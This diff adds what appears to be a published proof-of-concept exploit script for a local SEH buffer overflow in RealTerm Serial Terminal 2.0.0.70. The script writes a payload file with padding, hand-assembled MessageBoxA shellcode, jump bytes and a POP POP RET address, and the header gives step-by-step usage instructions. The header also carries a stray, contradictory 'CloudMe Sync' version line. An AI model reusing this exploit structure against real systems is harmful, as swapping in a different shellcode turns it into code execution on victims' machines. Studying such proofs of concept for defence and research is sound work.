@@ -1,0 +1,67 @@
+# Exploit Title: RealTerm: Serial Terminal 2.0.0.70 - 'Echo Port' Buffer Overflow - (SEH) 
+# Date: 21.02.2019
+# Exploit Author: Matteo Malvica
+# Vendor Homepage: https://realterm.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/realterm/files/ 
+# Version: 2.0.0.70
+# Category: Local
+# Contact: https://twitter.com/matteomalvica
+# Version: CloudMe Sync 1.11.2
+# Tested on: Windows 7 SP1 x64
+# Originail PoC https://www.exploit-db.com/exploits/46391
+
+# 1.- Run the python script  it will create a new file "carbonara.txt"
+# 2.- Copy the content of the new file 'carbonara.txt' to clipboard
+# 3.- Open realterm.exe 
+# 4.- Go to 'Echo Port' tab
+# 5.- Paste clipboard in 'Port' field
+# 6.- Click on button -> Change
+# 7.- Check 'Echo On' or 
+# 8.- Box!
+
+
+import socket
+import struct
+
+'''
+badchars: 0x20,0x0a
+arwin.exe user32.dll MessageBoxA
+arwin - win32 address resolution program - by steve hanna - v.01
+MessageBoxA is located at 0x747cfdae in user32.dll
+'''
+shellcode = (
+"\x33\xc0"                          # XOR EAX,EAX
+"\x50"                              # PUSH EAX      => padding for lpCaption
+"\x68\x7a\x6f\x21\x21"              # PUSH "zo!!"
+"\x68\x61\x76\x61\x6e"              # PUSH "avan"
+"\x8B\xCC"                          # MOV ECX,ESP   => PTR to lpCaption
+"\x50"                              # PUSH EAX      => padding for lpText
+"\x68\x6e\x7a\x6f\x21"              # PUSH "nzo!"
+"\x68\x61\x76\x61\x21"              # PUSH "ava!"
+"\x8B\xD4"                          # MOV EDX,ESP   => PTR to lpText
+"\x50"                              # PUSH EAX - uType=0x0
+"\x51"                              # PUSH ECX - lpCaption
+"\x52"                              # PUSH EDX - lpText
+"\x50"                              # PUSH EAX - hWnd=0x0
+"\xBE\xae\xfd\x7c\x74"              # MOV ESI,USER32.MessageBoxA <<< hardcoded address
+"\xFF\xD6")                         # CALL ESI
+
+pad1="\x90"*(142-len(shellcode))
+pad2 = "\x42" * 118
+nseh = "\xEB\x80\x90\x90"
+jmp_back = "\xEB\x80\x90\x90"
+short_jmp = "\xEB\x12\x90\x90"
+seh =  struct.pack('<L',0x00406e27)  # 00406e27# POP POP RET
+nops = "\x90\x90\x90\x90"
+payload = pad1  + shellcode + nops + jmp_back + pad2 + nseh + seh 
+
+
+try:
+        f=open("carbonara.txt","w")
+        print "[+] Creating %s bytes pasta payload.." %len(payload)
+        f.write(payload)
+        f.close()
+        print "[+] Carbonara created!"
+
+except:
+        print "Carbonara cannot be created"
